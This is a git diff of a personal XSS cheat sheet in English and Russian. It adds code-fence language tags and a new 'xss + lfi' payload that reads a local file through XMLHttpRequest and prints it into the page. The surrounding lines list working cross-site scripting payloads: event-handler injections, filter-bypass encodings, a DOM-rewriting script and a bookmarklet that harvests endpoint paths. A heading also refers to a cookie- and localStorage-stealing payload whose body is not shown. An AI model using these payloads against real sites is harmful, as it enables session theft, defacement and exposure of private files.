@@ -1,6 +1,6 @@
 tips for xxs
 without parantheses
-```
+```js
 <img src=1 onerror=alert(1)>
 #<img src=1 onerror=alert(1)>
 <script>document.querySelector(‘#thm-title’).textContent = I am a hacker'</script>
@@ -27,7 +27,7 @@ eval('alert(9)')
 ```
 ---
 Основные методы вызова js из html
-```
+```js
 <script>...</script>
 <img onerror="..." src="x">
 <a href="%20javascript:..."></a>
@@ -41,7 +41,7 @@ encode html entety
 пробелы могу заменяться “/”, тэг необязательно закрывать
 double URL encoding
 
-```
+```js
 prompt('xss')
 %00<script>alert(9)</script>
 alert(location.origin)
@@ -73,6 +73,10 @@ Here is An XSS payload that steals both Cookies and Local Storage Data:
 ────────────────────────────────────────────
 ```
 ---
-```
+```js
 javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
+```
+---
+```js
+xss + lfi <script>x = new XMLHttpRequest(); x.open('GET', 'file:///daab2a45fd5c44bca7b6_unzip/index.js', false); x.send(); document.write('<pre>' + x.responseText + '</pre>');</script>
 ```
